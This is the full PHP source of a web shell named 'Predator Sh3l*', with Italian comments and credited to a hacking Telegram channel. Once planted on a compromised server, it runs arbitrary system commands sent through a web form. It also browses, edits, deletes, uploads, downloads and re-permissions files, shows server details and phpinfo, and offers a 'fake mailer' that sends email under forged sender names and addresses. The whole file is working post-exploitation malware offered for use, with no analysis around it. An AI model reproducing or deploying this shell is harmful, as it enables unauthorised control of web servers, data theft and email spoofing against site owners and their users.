<?php

error_reporting(0);
//Copyright 2023 - Predator

//Titolo
echo "<title>Predator Sh3l*</title>";

//Style CSS

echo "<style>
input  {
                background: #b00;
                color: #fff;
            }

            input:hover  {
                background: #000;
            }

            select  {
                background: #b00;
                color: #fff;
            }
            
            select:hover  {
                background: #000;
            }

            hr  {     color: red;
                      background-color: red;
                      height: 3px;  
                      width:100%;
                      border:0;   }

            .footer table { border:1px dashed black
                    }

            .footer tr { border:1px groove black
                    }

            .footer td { border:1px groove black
                    }

            textarea  {
                background: #b00;
                color: #fff;
            }

            textarea:hover  {
                background: #000;
            }

            body  {
                font-family: courier,courier-new,arial;
                background-color:black;
                color:white;
            }

            A:link { text-decoration: none;
                     color:white
            }

            A:hover {  
                     color:red
            }

            a:visited { text-decoration: none;
            color: #FFFFFF;
            }

            A:visited:hover {  
                     color:red
            }

            table {border:1px dashed red}

            td {border:1px groove #666666}

            #dropper:hover  {
                color: #fff;
            }
        </style> ";

//Banner

echo "<center><img src='https://i.ibb.co/TktqYhR/logo.png' width='40%' /><b><a href=\"?\"><font color=\"red\" size=\"8\">Predator Sh3l*</font></a></b></center><br> <br>";
echo "<hr>";

//Applicazioni

echo "<center><b>[<a href=?mode=fakemail>Fake mailer</a>] [<a href=?mode=PHPinfo>PHP info</a>]</center><hr>";

//Info

echo "<center><table border=\"0\"><tr><td><b><font color=red>Ip server:</font></b> ".$_SERVER['SERVER_ADDR']."</td><td><b><font color=red>Server Software:</font></b> ".$_SERVER['SERVER_SOFTWARE']."</td><td><b><font color=red>Versione PHP:</font></b> ".phpversion()." </tr><tr>
<td><b><font color=red>Your ip:</font></b> ".$_SERVER['REMOTE_ADDR']."</td><td><b><font color=red>Safe mode:</font></b>";
if(@ini_get("safe_mode") == "1" || @ini_get("safe_mode") == "on"){  echo "On";}  else { echo "Off"; }
echo "</td><td><b><font color=red>id:</font></b> ".get_current_user()." | uid= ".getmyuid()." | gid= ".getmygid()."</td></tr></table></center><br><hr>";

//Variabili Generali

$dir = htmlspecialchars($_GET['dir']);


// Home shell

if(!isset($mode)){

         ($_GET['dir'] == '') ? $dir = @getcwd() : $dir = htmlspecialchars($_GET['dir']);
         @chdir($dir);

if (isset($dir)){

      
        echo "<form method=get>&nbsp;&nbsp;Dir : <input type=text name=dir value=$dir size=65%>&nbsp;<input type=submit value=Submit></form>";

}

echo "<table width=\"100%\" border=1><tr><td><b>File name</b></td><td><b>Type</b></td><td><b>Size (KB)</b></td><td><b>Chmod</b></td><td><b>Commands</b></td></tr>";
foreach (glob("*") as $file){
    $chmod = substr(sprintf('%o',fileperms($file)) , -3);
        if(is_dir($file)){

            if(isset($dir)){
                    echo "
                    
                    
                    <tr>
                            <td>
                                <a href=?dir=".@getcwd()."/".$file.">
                                    <font color=\"red\">$file</font>
                                </a>
                            </td>
                            <td>
                            Folder
                            <td>
                            ".filesize($file)."
                            </td>
                            <td>
                            $chmod
                            </td>
                            <td>
                            [<a href=?mode=rename&file=$dir/$file>R</a>] [<a href=?mode=delete&file=$dir/$file>D</a>] [<a href=?mode=copy&file=$dir/$file>C</a>] [<a href=?mode=chmod&file=$dir/$file&chmod=$chmod>P</a>] [<a href=?mode=download&file=$dir/$file>D</a>]
                            </td>
                        </tr>
                        ";
                    } else {
                    echo "<tr>
                            <td>
                                <a href=?dir=".@getcwd()."/".$file.">
                                    <font color=\"red\">$file</font>
                                </a>
                            </td>
                            <td>
                            Folder
                            </td>
                            <td>
                            ".filesize($file)."
                            </td>
                            <td>
                            $chmod
                            </td>
                            <td>
                            [<a href=?mode=rename&file=$dir/$file>R</a>] [<a href=?mode=delete&file=$dir/$file>D</a>] [<a href=?mode=copy&file=$dir/$file>C</a>] [<a href=?mode=chmod&file=$dir/$file&chmod=$chmod>P</a>] [<a href=?mode=download&file=$dir/$file>S</a>]
                            </td>
                        </tr>
                        ";
                    }
        } else {
            echo "<tr>
                    <td>
                        
                            <font color=\"white\">$file</font>
                        
                    </td>
                    <td>
                    File
                    </td>
                        <td>
                            ".filesize($file)."
                            </td>
                            <td>
                            $chmod
                            </td>
                            <td>
                            [<a href=?mode=open&file=$dir/$file>V</a>] [<a href=?mode=editor&file=$dir/$file>E</a>] [<a href=?mode=rename&file=$dir/$file>R</a>] [<a href=?mode=copy&file=$dir/$file>C</a>] [<a href=?mode=delete&file=$dir/$file>D</a>] [<a href=?mode=download&file=$dir/$file>S</a>] [<a href=?mode=chmod&file=$dir/$file&chmod=$chmod>P</a>]
                        </td>
                </tr>
                ";
        }
}
echo "</table>";

echo "<div class=footer>";

//Linea di comando

echo "<hr> <br> <Br> <center><table border=\"0\"><tr><td><b><center><font size=2>CMD</font></b><br> <br>
<form method=post><textarea name=cmd cols=70% rows=8% ></textarea><p><input type=submit value=Submit><p></form>";
if(isset($_POST['cmd'])){
    if(function_exists("system")){    
        echo "<p>OUTPUT : <p><textarea name=com cols=80% rows=15% >";
        system($_POST['cmd']);
        echo "</textarea>";    die();
    }
}

//Upload

echo "</td><td><table border=\"0\"><tr><td><b><center><font size=2>Upload</font></b><br> <br>
<form method=post enctype='multipart/form-data'><input type=file name=file><input type=submit value=Submit></form>";

if(@move_uploaded_file($_FILES['file']['tmp_name'] , $dir."/".$_FILES['file']['name'])){

    echo "<script>alert('File hostato con successo')</script>";

}

echo "</td></tr><tr><td>";

//Crypter

echo "<b><center><font size=2>Crypter</font></b><br> <br>
<form method=post><textarea name=crypt cols=70% rows=3% ></textarea><p><input type=submit value=Submit><p></form>";

if(isset($_POST['crypt'])){
    
    $md5=md5($_POST['crypt']);
    $sha1=sha1($_POST['crypt']);
    $crc32=crc32($_POST['crypt']);
    $base64_encode=base64_encode($_POST['crypt']);
    $base64_decode=base64_decode($_POST['crypt']);
    
    echo "<br> <br><b>Md5:</b> $md5 <br>
          <b>Sha1:</b> $sha1 <br>
          <b>crc32:</b> $crc32 <br>
          <b>Base64_encode:</b> $base64_encode<br>
          <b>Base64_decode:</b> $base64_decode<br>";
}
    
echo "</td></tr></table></td></tr></table></div><br></center>";

//File edit

} elseif($mode=="editor"){


    $file=htmlspecialchars($file);

    echo "<b><center><font size=2>Predator Sh3l*</font></center></b><br> <br>";


        if(file_exists($file)){

            if (isset($_POST['editing'])){
            $f=@fopen($file, 'w') or exit("<p>Permission Denied");
            fputs($f, stripslashes($_POST['editing']));
            fclose($f);
            echo "<script>alert('File editato')</script><a href=?>Return to the shell</a>";
        }else{
            $f2=fopen($file, 'r');
            echo"<center><form method=POST><font color=white><p>";
            echo"<textarea name=editing cols=130 rows=30>";
            while ( !feof($f2) ){
                $sourc = fgets($f2,4096);
                $source = htmlspecialchars($sourc);
                echo $source;
            }
            echo "</textarea><p><input type=submit value=SAVE></form>";
        }
    }else {  
        echo "<script>alert('ERROR - Impossibile modificare il file')</script><a href=?>Return to the shell</a>";  
    }

//File Rename

} elseif($mode=="rename"){

    echo "<b><center><font size=2>Rinomina file</font></center></b><br> <br>";

     $file=htmlspecialchars($file);

     if(file_exists($file)){
        echo "<center><form method=\"post\"><input type=\"text\" value=\"$file\" name=\"nome\"></input><br><input type=\"submit\" name=\"1\" value=\"rinomina\"></input></form></center>";
        if(isset($_POST['1'])){
            $name=htmlspecialchars($_POST['nome']);
            rename($file,$nome);
            echo "<script>alert('File rinominato con successo')</script><a href=?>Return to the shell</a>";
        } else {}
    }else {
    echo "<script>alert('ERRORE - File inesistente')</script><a href=?>Return to the shell</a>";
    }

// File Delete

}elseif($mode=="delete"){

    echo "<b><center><font size=2>Elimina file</font></center></b><br> <br>";

    $file=htmlspecialchars($file);

    if(file_exists($file)){
        unlink($file);
        echo "<script>alert('File eliminato con successo')</script><a href=?>Return to the shell</a>";
    } else {
        echo "<script>alert('ERRORE - File inesistente')</script><a href=?>Return to the shell</a>";
    }

//File open

}elseif($mode=="open"){

    $file=htmlspecialchars($file);

    echo "<b><center><font size=2>Visualizza file</font></center></b><br> <br>";
    echo "<center><iframe src=\"".$_SERVER['SERVER_ADDR']."/$dir/$file\" width=\"80%\" height=\"80%\"></iframe><br> <a href=\"?\">Return to the shell</a></center>";

//Chmod

} elseif($mode=="chmod"){

    $file=htmlspecialchars($file);
    $cm=htmlspecialchars($chmod);

        if(file_exists($file)){

            echo "<form method=post>&nbsp;&nbsp;Chmod : &nbsp;&nbsp;<input type=text name=mod value=$cm><input type=submit value=Submit name=click></form>";

             if(isset($_POST['mod'])){
            @chmod($file , $_POST['mod']) or die('Permessi insufficenti');
                  echo "<script>alert('Permessi cambiati con successo')</script> <a href=\"?\">Return to the shell</a>";
                 }
        }else {
        echo "<script>alert('ERROR - File inesistente')</script> <a href=\"?\">Return to the shell</a>";  
    }

//Download

} elseif($mode=="download"){

    $file=htmlspecialchars($file);
    if(file_exists($file)){
    header("Content-type: Application/octet-stream");
    header("Content-Disposition: attachment; filename=".basename($file));
    header("Content-Description: Download");
    readfile($file);
    die();
    }else {
    echo "<script>alert('ERROR - File inesistente')</script><a href=\"?\">Return to the shell</a>";
        }

//PHPinfo

} elseif($mode=="PHPinfo"){

    phpinfo();

//Fake mailer

} elseif($mode=="fakemail"){

    echo "<b><center><font size=2>Submit Mail</font></center></b><br> <br>";

    if(isset($_POST['yourname']) AND isset($_POST['yourmail']) AND isset($_POST['dest']) AND isset($_POST['ogg']) AND isset($_POST['mess'])){

        $header =  "From : ".$_POST['yourname']." <".$_POST['yourmail'].">\n";

        @mail($_POST['dest'] , $_POST['ogg'] , $_POST['mess'] , $header) or die('Errore invio Email');


    } else {

        echo "<form method=post>Tuo nome : <input type=text name=yourname><p>
            Tua email : <input type=text name=yourmail><p>
            Destinatario : <input type=text name=dest><p>
            Oggetto : <input type=text name=ogg><p>
            Messaggio : <p><textarea name=mess cols=40% rows=5%></textarea><p>
            <input type=submit value=Submit></form>";
}


//File copy

} elseif($mode=="copy"){

    echo "<b><center><font size=2>Copia file</font></center></b><br> <br>";

    $file=htmlspecialchars($file);

    if(file_exists($file)){
        copy($file,$file."2");
        echo "<script>alert('File copiato con successo')</script><a href=?>Return to the shell</a>";
    } else {
        echo "<script>alert('ERRORE - File inesistente')</script><a href=?>Return to the shell</a>";
    }

//??? ??? ???

} elseif($mode=="ryemp"){

    echo "<center><big><b>Complimenti ai trovato l'eggs xD</big><br>ora... goditelo!</b><br> <br><img src=\"http://img78.imageshack.us/img78/9656/7696pamelaandersonem6.jpg\"></center>";


}
else {
    echo "<script>alert('ERROR - Comando inesistente')</script><a href=?>Return to the shell</a>";

}


//FOOTER

echo "<center><hr><font size=1>Powered By <a href=http://t.me/OBHACKING target=_Blank >@OBHACKING</a></font></center>";

?>